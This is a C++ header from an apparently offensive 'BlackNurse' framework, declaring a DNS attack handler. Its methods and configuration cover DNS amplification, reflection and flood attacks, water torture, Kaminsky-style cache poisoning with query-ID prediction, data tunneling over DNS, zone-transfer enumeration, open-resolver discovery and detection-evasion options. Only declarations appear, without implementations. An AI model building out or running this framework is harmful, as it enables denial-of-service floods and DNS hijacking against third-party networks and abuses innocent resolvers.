/**
 * BlackNurse Framework  - DNS Protocol Handler
 * 
 * DNS attack capabilities including DNS amplification, cache poisoning,
 * DNS tunneling, subdomain enumeration, and sophisticated DNS-based attacks
 */

#pragma once

#include <string>
#include <vector>
#include <memory>
#include <atomic>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <random>
#include <queue>
#include <unordered_map>
#include <unordered_set>
#include <regex>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <resolv.h>

#include "../framework/framework_core.hpp"
#include "../common/config.hpp"
#include "../common/logger.hpp"

namespace BlackNurse {

/**
 * DNS Record Types
 */
enum class DnsRecordType : uint16_t {
    A = 1,
    NS = 2,
    CNAME = 5,
    SOA = 6,
    PTR = 12,
    MX = 15,
    TXT = 16,
    AAAA = 28,
    SRV = 33,
    NAPTR = 35,
    DS = 43,
    RRSIG = 46,
    NSEC = 47,
    DNSKEY = 48,
    NSEC3 = 50,
    TLSA = 52,
    CAA = 257,
    ANY = 255
};

/**
 * DNS Query Classes
 */
enum class DnsClass : uint16_t {
    IN = 1,    // Internet
    CS = 2,    // CSNET
    CH = 3,    // CHAOS
    HS = 4,    // Hesiod
    ANY = 255  // Any class
};

/**
 * DNS Header Structure
 */
struct DnsHeader {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;  // Questions
    uint16_t ancount;  // Answers
    uint16_t nscount;  // Authority RRs
    uint16_t arcount;  // Additional RRs
};

/**
 * DNS Question Structure
 */
struct DnsQuestion {
    std::string qname;
    DnsRecordType qtype;
    DnsClass qclass;
};

/**
 * DNS Resource Record
 */
struct DnsResourceRecord {
    std::string name;
    DnsRecordType type;
    DnsClass rclass;
    uint32_t ttl;
    uint16_t rdlength;
    std::vector<uint8_t> rdata;
};

/**
 * DNS Packet Structure
 */
struct DnsPacket {
    DnsHeader header;
    std::vector<DnsQuestion> questions;
    std::vector<DnsResourceRecord> answers;
    std::vector<DnsResourceRecord> authority;
    std::vector<DnsResourceRecord> additional;
    
    // Metadata
    std::chrono::steady_clock::time_point timestamp;
    std::string source_ip;
    uint16_t source_port;
    size_t packet_size = 0;
};

/**
 * DNS Server Information
 */
struct DnsServer {
    std::string ip;
    uint16_t port = 53;
    std::string name;
    bool supports_recursion = true;
    bool supports_dnssec = false;
    bool supports_edns = false;
    std::chrono::milliseconds response_time{0};
    double amplification_factor = 1.0;
    bool is_open_resolver = false;
    std::vector<std::string> supported_record_types;
};

/**
 * DNS Attack Configuration
 */
struct DnsAttackConfig {
    AttackType attack_type = AttackType::DNS_AMPLIFICATION;
    uint32_t queries_per_second = 1000;
    std::vector<std::string> target_domains;
    std::vector<DnsRecordType> query_types;
    
    // Amplification specific
    std::vector<std::string> amplification_servers;
    bool use_any_queries = true;
    bool use_txt_queries = true;
    bool use_mx_queries = true;
    uint32_t max_amplification_factor = 100;
    
    // Cache poisoning
    std::string poison_domain;
    std::string poison_ip;
    uint32_t poison_ttl = 3600;
    bool use_birthday_attack = true;
    uint32_t birthday_attempts = 65536;
    
    // Subdomain enumeration
    std::vector<std::string> subdomain_wordlist;
    bool use_wildcard_detection = true;
    bool use_zone_transfer = true;
    uint32_t enumeration_threads = 10;
    
    // DNS tunneling
    std::string tunnel_domain;
    std::string tunnel_data;
    bool encode_base64 = true;
    bool use_compression = true;
    uint32_t max_label_length = 63;
    
    // Evasion
    bool randomize_query_id = true;
    bool randomize_case = true;
    bool use_edns = false;
    uint16_t edns_buffer_size = 4096;
    bool fragment_queries = false;
    
    // Rate control
    bool adaptive_rate = true;
    std::chrono::milliseconds query_timeout{5000};
    uint32_t max_retries = 3;
    std::chrono::milliseconds retry_delay{1000};
};

/**
 * DNS Protocol Handler Implementation
 */
class DnsHandler : public ProtocolHandler {
public:
    DnsHandler();
    ~DnsHandler() override;
    
    // ProtocolHandler interface
    bool initialize(const blacknurse::Config& config) override;
    bool execute_attack(const Target& target, const AttackConfig& config, AttackStats& stats) override;
    bool supports_attack_type(AttackType type) const override;
    std::vector<EvasionTechnique> get_supported_evasions() const override;
    bool validate_target(const Target& target) const override;
    void cleanup() override;
    
    // DNS-specific methods
    bool send_dns_query(const DnsPacket& query, const std::string& server, uint16_t port = 53);
    bool receive_dns_response(DnsPacket& response, std::chrono::milliseconds timeout = std::chrono::milliseconds(5000));
    
    // Attack implementations
    bool execute_dns_amplification(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_dns_flood(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_cache_poisoning(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_subdomain_enumeration(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_dns_tunneling(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_zone_transfer_attack(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_dns_rebinding(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    
    // Enhanced DNS attacks
    bool execute_kaminsky_attack(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_dns_water_torture(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_nxdomain_attack(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    bool execute_dns_reflection(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    
    // DNS server discovery and analysis
    std::vector<DnsServer> discover_dns_servers(const std::string& domain);
    bool analyze_dns_server(DnsServer& server);
    double measure_amplification_factor(const DnsServer& server, DnsRecordType query_type);
    bool test_open_resolver(const DnsServer& server);
    
    // DNS enumeration
    std::vector<std::string> enumerate_subdomains(const std::string& domain, const std::vector<std::string>& wordlist);
    std::vector<DnsResourceRecord> attempt_zone_transfer(const std::string& domain, const std::string& nameserver);
    bool detect_wildcard_dns(const std::string& domain);
    
private:
    // Socket management
    int udp_socket_fd_ = -1;
    int tcp_socket_fd_ = -1;
    bool sockets_initialized_ = false;
    
    // DNS packet crafting
    DnsPacket craft_dns_query(const std::string& domain, DnsRecordType type = DnsRecordType::A, DnsClass qclass = DnsClass::IN);
    DnsPacket craft_amplification_query(const std::string& domain, const std::string& amplifier);
    DnsPacket craft_poison_query(const std::string& domain, const std::string& poison_ip);
    DnsPacket craft_tunnel_query(const std::string& data, const std::string& tunnel_domain);
    
    // Packet serialization/deserialization
    std::vector<uint8_t> serialize_dns_packet(const DnsPacket& packet);
    bool deserialize_dns_packet(const std::vector<uint8_t>& data, DnsPacket& packet);
    void serialize_dns_header(std::vector<uint8_t>& buffer, const DnsHeader& header);
    void serialize_dns_question(std::vector<uint8_t>& buffer, const DnsQuestion& question);
    void serialize_dns_rr(std::vector<uint8_t>& buffer, const DnsResourceRecord& rr);
    
    // DNS name encoding/decoding
    std::vector<uint8_t> encode_dns_name(const std::string& name);
    std::string decode_dns_name(const std::vector<uint8_t>& data, size_t& offset);
    bool is_compressed_name(uint8_t byte);
    
    // Query generation
    std::vector<DnsQuestion> generate_amplification_queries(const std::string& domain);
    std::vector<DnsQuestion> generate_enumeration_queries(const std::string& domain, const std::vector<std::string>& subdomains);
    DnsQuestion generate_any_query(const std::string& domain);
    DnsQuestion generate_txt_query(const std::string& domain);
    DnsQuestion generate_mx_query(const std::string& domain);
    
    // Cache poisoning utilities
    std::vector<DnsPacket> generate_poison_packets(const std::string& domain, const std::string& poison_ip, uint32_t count);
    bool execute_birthday_attack(const std::string& domain, const std::string& poison_ip, uint32_t attempts);
    uint16_t predict_query_id(const std::string& server);
    
    // DNS tunneling
    std::string encode_tunnel_data(const std::string& data, bool use_base64 = true);
    std::string decode_tunnel_data(const std::string& encoded_data, bool use_base64 = true);
    std::vector<std::string> split_tunnel_data(const std::string& data, size_t max_label_length);
    std::string reconstruct_tunnel_data(const std::vector<std::string>& labels);
    
    // Attack workers
    void amplification_worker(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    void flood_worker(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    void enumeration_worker(const Target& target, const DnsAttackConfig& config, AttackStats& stats, const std::vector<std::string>& subdomains);
    void poisoning_worker(const Target& target, const DnsAttackConfig& config, AttackStats& stats);
    
    // Response monitoring
    void start_response_monitor();
    void stop_response_monitor();
    void monitor_dns_responses();
    bool analyze_dns_response(const DnsPacket& response);
    
    // Rate limiting and timing
    std::chrono::steady_clock::time_point last_query_time_;
    std::mutex rate_limit_mutex_;
    void enforce_rate_limit(uint32_t target_qps);
    std::chrono::milliseconds calculate_adaptive_delay(double success_rate);
    
    // Statistics tracking
    std::atomic<uint64_t> queries_sent_{0};
    std::atomic<uint64_t> responses_received_{0};
    std::atomic<uint64_t> amplification_bytes_{0};
    std::atomic<uint64_t> successful_poisoning_attempts_{0};
    std::atomic<uint64_t> discovered_subdomains_{0};
    std::atomic<double> average_response_time_{0.0};
    
    // DNS server management
    std::vector<DnsServer> known_servers_;
    std::unordered_set<std::string> tested_servers_;
    std::mutex servers_mutex_;
    
    // Wordlists and data
    std::vector<std::string> default_subdomain_wordlist_;
    std::vector<std::string> common_dns_servers_;
    std::unordered_map<DnsRecordType, std::string> record_type_names_;
    
    // Random generators
    std::random_device rd_;
    std::mt19937 gen_;
    std::uniform_int_distribution<uint16_t> id_dist_;
    std::uniform_int_distribution<uint8_t> case_dist_;
    
    // Attack state
    std::atomic<bool> attack_active_{false};
    std::atomic<bool> monitor_active_{false};
    std::vector<std::thread> worker_threads_;
    std::thread monitor_thread_;
    std::atomic<bool> shutdown_requested_{false};
    
    // Configuration
    bool initialized_ = false;
    blacknurse::Config framework_config_;
    
    // Utility methods
    bool setup_sockets();
    void cleanup_sockets();
    bool set_socket_options();
    void initialize_wordlists();
    void initialize_dns_servers();
    void log_dns_query(const DnsPacket& query, const std::string& server);
    void log_dns_response(const DnsPacket& response);
    
    // Validation and parsing
    bool is_valid_domain_name(const std::string& domain);
    bool is_valid_ip_address(const std::string& ip);
    std::string normalize_domain_name(const std::string& domain);
    std::vector<std::string> parse_dns_response_ips(const DnsPacket& response);
    
    // EDNS support
    void add_edns_option(DnsPacket& packet, uint16_t buffer_size = 4096);
    bool parse_edns_options(const DnsPacket& packet);
    
    // DNSSEC utilities
    bool verify_dnssec_signature(const DnsResourceRecord& rrsig, const std::vector<DnsResourceRecord>& rrset);
    bool validate_dnssec_chain(const std::vector<DnsResourceRecord>& chain);
    
    // Evasion techniques
    void apply_dns_evasions(DnsPacket& packet, const std::vector<EvasionTechnique>& techniques);
    void randomize_query_case(std::string& domain);
    void add_random_padding(DnsPacket& packet);
    void fragment_dns_query(DnsPacket& packet);
    
    // Performance optimization
    void optimize_query_rate(double success_rate);
    void balance_server_load();
    void cache_successful_servers();
    
    // Error handling
    bool handle_dns_error(int error_code, const std::string& context);
    bool should_retry_query(const DnsPacket& response);
    void update_server_reliability(const std::string& server, bool success);
};

/**
 * DNS Utility Functions
 */
namespace DnsUtils {
    std::string record_type_to_string(DnsRecordType type);
    DnsRecordType string_to_record_type(const std::string& type_str);
    std::string class_to_string(DnsClass qclass);
    DnsClass string_to_class(const std::string& class_str);
    bool is_valid_dns_name(const std::string& name);
    std::string generate_random_subdomain(size_t length = 8);
    std::vector<std::string> load_wordlist_from_file(const std::string& filename);
    std::string ip_to_reverse_dns(const std::string& ip);
    std::string reverse_dns_to_ip(const std::string& reverse_dns);
    uint16_t calculate_dns_checksum(const std::vector<uint8_t>& data);
    bool is_dns_response_valid(const DnsPacket& packet);
    double calculate_entropy(const std::string& data);
}

} // namespace BlackNurse